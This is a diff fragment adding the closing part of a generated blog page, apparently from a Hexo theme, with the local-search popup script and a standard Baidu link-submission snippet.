+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
